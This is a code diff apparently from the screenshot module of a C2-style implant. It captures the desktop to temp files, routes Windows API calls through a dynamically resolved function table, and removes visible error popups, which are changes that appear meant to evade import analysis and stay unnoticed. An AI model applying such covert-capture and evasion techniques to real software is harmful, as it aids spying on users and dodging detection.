@@ -9,19 +9,19 @@ std::wstring wFilenamePng;
 
 namespace Task::Helper::Screenshot
 {
-    BOOL InitInstance(HINSTANCE hInstance, INT nCmdShow)
+    BOOL InitInstance(Procs::PPROCS pProcs, HINSTANCE hInstance, INT nCmdShow)
     {
         hInst = hInstance;
 
-        HWND hWnd = CreateWindowExW(
+        HWND hWnd = pProcs->lpCreateWindowExW(
             WS_EX_TRANSPARENT, // WS_EX_TOPMOST | WS_EX_TRANSPARENT | WS_EX_LAYERED,
             wWindowClassName.c_str(),
             L"Sample",
             WS_OVERLAPPEDWINDOW,
             CW_USEDEFAULT,
             CW_USEDEFAULT,
-            GetSystemMetrics(SM_CXFULLSCREEN), // GetSystemMetrics(SM_CXSCREEN),
-            GetSystemMetrics(SM_CYFULLSCREEN), // GetSystemMetrics(SM_CYSCREEN),
+            pProcs->lpGetSystemMetrics(SM_CXFULLSCREEN), // GetSystemMetrics(SM_CXSCREEN),
+            pProcs->lpGetSystemMetrics(SM_CYFULLSCREEN), // GetSystemMetrics(SM_CYSCREEN),
             (HWND)NULL,
             (HMENU)NULL,
             hInstance,
@@ -33,8 +33,8 @@ namespace Task::Helper::Screenshot
             return FALSE;
         }
 
-        ShowWindow(hWnd, nCmdShow);
-        UpdateWindow(hWnd);
+        pProcs->lpShowWindow(hWnd, nCmdShow);
+        pProcs->lpUpdateWindow(hWnd);
         return TRUE;
     }
 
@@ -154,7 +154,6 @@ namespace Task::Helper::Screenshot
                 SRCCOPY
             )
         ) {
-            MessageBox(hWnd, L"StretchBlt has failed", L"Failed", MB_OK);
             goto done;
         }
 
@@ -167,7 +166,6 @@ namespace Task::Helper::Screenshot
 
         if (!hbmScreen)
         {
-            MessageBox(hWnd, L"CreateCompatibleBitmap Failed", L"Failed", MB_OK);
             goto done;
         }
 
@@ -186,7 +184,6 @@ namespace Task::Helper::Screenshot
             0,
             SRCCOPY
         )) {
-            MessageBox(hWnd, L"BitBlt has failed", L"Failed", MB_OK);
             goto done;
         }
 
@@ -311,7 +308,7 @@ namespace Task::Helper::Screenshot
         return 0;
     }
 
-    ATOM MyRegisterClass(HINSTANCE hInstance)
+    ATOM MyRegisterClass(Procs::PPROCS pProcs, HINSTANCE hInstance)
     {
         WNDCLASSEXW wcex;
         wcex.cbSize = sizeof(WNDCLASSEX);
@@ -320,14 +317,14 @@ namespace Task::Helper::Screenshot
         wcex.cbClsExtra = 0;
         wcex.cbWndExtra = 0;
         wcex.hInstance = hInstance;
-        wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_GDICAPTURINGANIMAGE));
-        wcex.hCursor = LoadCursor(nullptr, IDC_ARROW);
+        wcex.hIcon = pProcs->lpLoadIconW(hInstance, MAKEINTRESOURCE(IDI_GDICAPTURINGANIMAGE));
+        wcex.hCursor = pProcs->lpLoadCursorW(nullptr, IDC_ARROW);
         wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
         wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_GDICAPTURINGANIMAGE);
         wcex.lpszClassName = wWindowClassName.c_str();
-        wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));
+        wcex.hIconSm = pProcs->lpLoadIconW(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));
 
-        return RegisterClassExW(&wcex);
+        return pProcs->lpRegisterClassExW(&wcex);
     }
 }
 
@@ -338,22 +335,27 @@ namespace Task
         wFilenameBmp = System::Env::EnvStringsGet(pState->pProcs, L"%TEMP%") + L"\\tmp.bmp";
         wFilenamePng = System::Env::EnvStringsGet(pState->pProcs, L"%TEMP%") + L"\\tmp.png";
 
-        Task::Helper::Screenshot::MyRegisterClass(pState->hInstance);
+        Task::Helper::Screenshot::MyRegisterClass(pState->pProcs, pState->hInstance);
 
         // Perform application initialization:
-        if (!Task::Helper::Screenshot::InitInstance(pState->hInstance, pState->nCmdShow))
+        if (!Task::Helper::Screenshot::InitInstance(pState->pProcs, pState->hInstance, pState->nCmdShow))
         {
             return L"Error: Could not initialize.";
         }
 
-        HACCEL hAccelTable = LoadAccelerators(pState->hInstance, MAKEINTRESOURCE(IDC_GDICAPTURINGANIMAGE));
+        HACCEL hAccelTable = pState->pProcs->lpLoadAcceleratorsW(
+            pState->hInstance,
+            MAKEINTRESOURCE(IDC_GDICAPTURINGANIMAGE)
+        );
 
         MSG msg;
+        // while (pState->pProcs->lpGetMessage(&msg, nullptr, 0, 0)) // This function cannot be loaded...
         while (GetMessage(&msg, nullptr, 0, 0))
         {
-            if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
+            if (!pState->pProcs->lpTranslateAcceleratorW(msg.hwnd, hAccelTable, &msg))
             {
-                TranslateMessage(&msg);
+                pState->pProcs->lpTranslateMessage(&msg);
+                // pState->pProcs->lpDispatchMessage(&msg); // this function cannot be loaded...
                 DispatchMessage(&msg);
             }
         }
